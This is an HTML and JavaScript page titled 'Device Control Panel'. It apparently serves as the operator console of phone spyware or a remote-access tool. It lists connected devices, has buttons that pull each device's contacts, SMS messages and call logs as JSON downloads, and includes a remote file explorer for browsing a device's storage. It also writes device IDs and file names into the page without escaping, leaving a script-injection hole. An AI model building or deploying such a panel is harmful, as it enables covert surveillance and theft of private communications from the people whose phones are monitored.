<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Device Control Panel</title>
  <style>
    body {
      font-family: sans-serif;
      background: #f4f4f4;
      padding: 2rem;
    }
    h1, h2 {
      color: #333;
    }
    .device {
      background: white;
      padding: 1rem;
      margin: 0.5rem 0;
      border-radius: 6px;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
    }
    .online { color: green; font-weight: bold; }
    .offline { color: red; font-weight: bold; }
    .btn {
      padding: 0.4rem 0.8rem;
      margin: 0.2rem;
      background: #007bff;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }
    .file-explorer {
      background: white;
      padding: 1rem;
      margin-top: 1rem;
      border-radius: 6px;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
      display: none;
    }
    .file-explorer-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 1rem;
    }
    .file-explorer-path {
      font-weight: bold;
      margin-bottom: 0.5rem;
      word-break: break-all;
    }
    .file-explorer-breadcrumb {
      background: #f8f9fa;
      padding: 0.5rem;
      border-radius: 4px;
      margin-bottom: 1rem;
    }
    .file-item {
      display: flex;
      align-items: center;
      padding: 0.5rem;
      border-bottom: 1px solid #eee;
      cursor: pointer;
    }
    .file-item:hover {
      background: #f8f9fa;
    }
    .file-item-icon {
      margin-right: 0.5rem;
      font-size: 1.2rem;
    }
    .file-item-name {
      flex-grow: 1;
    }
    .file-item-details {
      color: #666;
      font-size: 0.8rem;
    }
    .directory-icon {
      color: #ffc107;
    }
    .file-icon {
      color: #6c757d;
    }
    .loading {
      text-align: center;
      padding: 1rem;
      color: #666;
    }
  </style>
</head>
<body>
  <h1>Connected Devices</h1>
  <div id="deviceList">Loading...</div>

  <div id="fileExplorer" class="file-explorer">
    <div class="file-explorer-header">
      <h2>File Explorer</h2>
      <button class="btn" id="closeExplorer">Close</button>
    </div>
    <div class="file-explorer-breadcrumb">
      <div class="file-explorer-path" id="currentPath">Loading...</div>
    </div>
    <div id="fileList">
      <div class="loading">Loading...</div>
    </div>
  </div>

  <script>
    let currentDeviceId = null;
    let currentPath = "/";
    const socket = new WebSocket(`ws://${location.host}`);

    socket.addEventListener('open', () => {
      console.log('Connected to backend');
      socket.send(JSON.stringify({ type: 'panelConnect' }));
    });

    socket.addEventListener('message', (event) => {
      const message = JSON.parse(event.data);

      if (message.type === 'deviceList') {
        const container = document.getElementById('deviceList');
        container.innerHTML = '';

        if (message.data.length === 0) {
          container.innerHTML = '<p>No devices connected</p>';
          return;
        }

        message.data.forEach((device) => {
          const el = document.createElement('div');
          el.className = 'device';
          el.innerHTML = `
            <div><strong>ID:</strong> ${device.id}</div>
            <div><strong>Status:</strong> <span class="${device.online ? 'online' : 'offline'}">${device.online ? 'Online' : 'Offline'}</span></div>
            <div><strong>Last Seen:</strong> ${device.lastSeen}</div>
            <button class="btn" onclick="requestData('${device.id}', 'contacts')">Download Contacts</button>
            <button class="btn" onclick="requestData('${device.id}', 'sms')">Download SMS</button>
            <button class="btn" onclick="requestData('${device.id}', 'calls')">Download Call Logs</button>
            <button class="btn" onclick="openFileExplorer('${device.id}')" ${!device.online ? 'disabled' : ''}>File Explorer</button>
          `;
          container.appendChild(el);
        });
      }

      if (message.type === 'dataResponse') {
        const { deviceId, dataType, payload } = message;
        const blob = new Blob([JSON.stringify(payload, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const link = document.createElement('a');
        link.href = url;
        link.download = `${deviceId}-${dataType}.json`;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        URL.revokeObjectURL(url);
      }

      if (message.type === 'fileExplorerResponse') {
        const { deviceId, action, path, items, error } = message;
        
        // Only process if this is for the current device
        if (deviceId !== currentDeviceId) return;
        
        if (error) {
          alert(`Error: ${error}`);
          return;
        }

        // Update current path
        currentPath = path;
        document.getElementById('currentPath').textContent = currentPath;
        
        // Render file list
        const fileList = document.getElementById('fileList');
        fileList.innerHTML = '';
        
        if (items && items.length > 0) {
          items.forEach(item => {
            const fileItem = document.createElement('div');
            fileItem.className = 'file-item';
            
            if (item.type === 'directory') {
              fileItem.innerHTML = `
                <div class="file-item-icon directory-icon">üìÅ</div>
                <div class="file-item-name">${item.name}</div>
                <div class="file-item-details">${formatDate(item.lastModified)}</div>
              `;
              fileItem.onclick = () => navigateTo(item.path);
            } else {
              fileItem.innerHTML = `
                <div class="file-item-icon file-icon">üìÑ</div>
                <div class="file-item-name">${item.name}</div>
                <div class="file-item-details">${formatFileSize(item.size)} - ${formatDate(item.lastModified)}</div>
              `;
            }
            
            fileList.appendChild(fileItem);
          });
        } else {
          fileList.innerHTML = '<div class="loading">No files found</div>';
        }
      }
    });

    function requestData(deviceId, dataType) {
      socket.send(JSON.stringify({
        type: 'requestData',
        targetId: deviceId,
        dataType: dataType
      }));
    }

    function openFileExplorer(deviceId) {
      currentDeviceId = deviceId;
      document.getElementById('fileExplorer').style.display = 'block';
      
      // Request root directory listing
      socket.send(JSON.stringify({
        type: 'fileExplorer',
        targetId: deviceId,
        action: 'listRoot',
        path: '/'
      }));
      
      currentPath = '/';
      document.getElementById('currentPath').textContent = 'Loading...';
      document.getElementById('fileList').innerHTML = '<div class="loading">Loading...</div>';
    }

    function navigateTo(path) {
      socket.send(JSON.stringify({
        type: 'fileExplorer',
        targetId: currentDeviceId,
        action: 'listDirectory',
        path: path
      }));
      
      document.getElementById('fileList').innerHTML = '<div class="loading">Loading...</div>';
    }

    function formatFileSize(bytes) {
      if (bytes === 0) return '0 Bytes';
      const k = 1024;
      const sizes = ['Bytes', 'KB', 'MB', 'GB'];
      const i = Math.floor(Math.log(bytes) / Math.log(k));
      return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
    }

    function formatDate(timestamp) {
      return new Date(timestamp).toLocaleString();
    }

    // Close explorer button
    document.getElementById('closeExplorer').addEventListener('click', () => {
      document.getElementById('fileExplorer').style.display = 'none';
      currentDeviceId = null;
    });
  </script>
</body>
</html>